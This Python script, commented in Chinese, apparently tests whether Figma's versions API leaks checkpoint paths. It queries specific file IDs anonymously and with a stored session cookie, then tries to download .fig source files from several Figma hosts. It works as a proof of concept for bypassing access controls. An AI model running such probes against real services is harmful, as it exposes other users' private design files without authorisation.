# -*- coding: utf-8 -*-
"""checkpoint(.fig) 下载权限验证: 匿名/Viewer 能否下载公开文件的完整源文件
关键: versions API 泄露 canvas_path -> checkpoints/xxx.fig
Figma 产品行为: 公开文件可查看, 但 .fig 源文件下载通常需要编辑权限
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
B_MAKE = "QooNP4ZnOkwGbudKlPX635"
PUBLIC_FILE = "bv2nMIdFf4u3dESGail4sm"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def call(label, path, query=None, cookie=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/"}
    if cookie:
        headers["Cookie"] = cookie
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} len={len(raw)} :: {raw[:300]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} :: {raw[:300]}")
        return e.code, raw


print("===== 1. 匿名 versions: B 的公开 make 文件 =====")
st, raw = call("anon versions B_make", f"/api/versions/{B_MAKE}", {"page_size": 50})
paths = []
if st == 200:
    try:
        d = json.loads(raw)
        for v in d.get("meta", {}).get("versions", []):
            cp = v.get("canvas_path")
            if cp:
                paths.append((v["id"], cp))
        print(f"  -> {len(paths)} checkpoint paths")
    except Exception as e:
        print("  parse err", e)

print("\n===== 2. B versions: 公开 make 文件 (对照) =====")
st, raw = call("B versions B_make", f"/api/versions/{B_MAKE}", {"page_size": 50}, cookie=BC)
if st == 200:
    try:
        d = json.loads(raw)
        for v in d.get("meta", {}).get("versions", []):
            print("  ver:", v["id"], "canvas_path:", v.get("canvas_path"), "checkpoint_key:", v.get("checkpoint_key"))
    except Exception as e:
        print("  parse err", e)

print("\n===== 3. 匿名 versions: 公开设计文件 (page_size 大) =====")
call("anon versions pub", f"/api/versions/{PUBLIC_FILE}", {"page_size": 200})

print("\n===== 4. 下载 checkpoint 路径 (若拿到) =====")
for cid, cp in paths[:3]:
    for host in ["https://static.figma.com/", "https://s3-alpha-sig.figma.com/", "https://www.figma.com/"]:
        u = host + cp
        try:
            req = urllib.request.Request(u, headers={"User-Agent": UA})
            with urllib.request.urlopen(req, timeout=20) as r:
                hdr = dict(r.headers)
                print(f"[{cid} @ {host}] HTTP {r.status} type={hdr.get('Content-Type')} len={hdr.get('Content-Length')}")
        except urllib.error.HTTPError as e:
            print(f"[{cid} @ {host}] HTTP {e.code}")
        except Exception as e:
            print(f"[{cid} @ {host}] ERR {e}")
